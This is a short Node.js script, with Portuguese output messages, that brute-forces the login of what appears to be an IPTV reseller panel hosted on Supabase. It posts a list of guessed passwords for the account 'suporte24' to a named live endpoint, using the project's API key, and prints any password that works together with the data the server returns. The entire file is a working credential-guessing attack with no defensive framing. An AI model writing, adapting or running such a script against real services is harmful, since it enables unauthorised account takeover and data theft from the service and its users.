const https = require("https");
const passwords = ["suporte24", "playtv", "suporte123", "playtv123", "admin", "123456", "master"];

function tryPass(pass) {
  const p = JSON.stringify({ p_reseller_id: "suporte24", p_password: pass });
  const req = https.request({
    hostname: "myreymyqsnikjdhnstjn.supabase.co",
    path: "/rest/v1/rpc/panel_login_dashboard",
    method: "POST",
    headers: {
      "apikey": "sb_publishable_Jsb0b0Kcf5-bv6GCUFu3KA_wO1G9HjM",
      "Authorization": "Bearer sb_publishable_Jsb0b0Kcf5-bv6GCUFu3KA_wO1G9HjM",
      "Content-Type": "application/json"
    }
  }, res => {
    let d = "";
    res.on("data", c => d += c);
    res.on("end", () => {
      if (res.statusCode === 200) {
        console.log("PASS ENCONTRADA:", pass);
        console.log("DADOS:", d);
      } else {
        console.log("Falhou pass", pass, res.statusCode);
      }
    });
  });
  req.write(p);
  req.end();
}

passwords.forEach(tryPass);
